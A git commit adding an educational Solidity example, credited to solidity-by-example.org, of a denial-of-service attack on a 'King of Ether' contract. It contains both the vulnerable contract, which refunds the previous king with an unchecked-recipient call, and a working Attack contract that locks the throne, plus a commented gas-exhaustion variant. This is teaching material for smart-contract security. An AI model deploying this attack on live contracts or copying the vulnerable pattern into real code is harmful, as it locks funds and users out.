5f5a0328929b97e46b14242142028b18bd92f96d
smartypants042 <tanishqchaudhary511@gmail.com>
2020-12-04 12:03:41 +0530

    Adding the Denial-of-Service Attack in Solidity

---
+++ Solidity/Break/DoS.sol
@@ -0,0 +1,38 @@
+// SPDX-License-Identifier: GPL-3.0
+// (direct) Source: https://solidity-by-example.org/0.6/hacks/denial-of-service/
+pragma solidity ^0.7.0;
+
+contract KingOfEther {
+    address public king;
+    uint public balance;
+
+    function claimThrone() external payable {
+        require(msg.value > balance, "Need to pay more to become the king");
+
+        (bool sent, ) = king.call{value: balance}("");
+        require(sent, "Failed to send Ether");
+
+        balance = msg.value;
+        king = msg.sender;
+    }
+}
+
+contract Attack {
+    KingOfEther kingOfEther;
+
+    constructor(KingOfEther _kingOfEther) public {
+        kingOfEther = KingOfEther(_kingOfEther);
+    }
+
+    // You can also perform a DOS by consuming all gas using assert.
+    // This attack wil work even if the calling contract does not check
+    // whether the call was successful or not.
+    //
+    // function () external payable {
+    //     assert(false);
+    // }
+
+    function attack() public payable {
+        kingOfEther.claimThrone{value: msg.value}();
+    }
+}
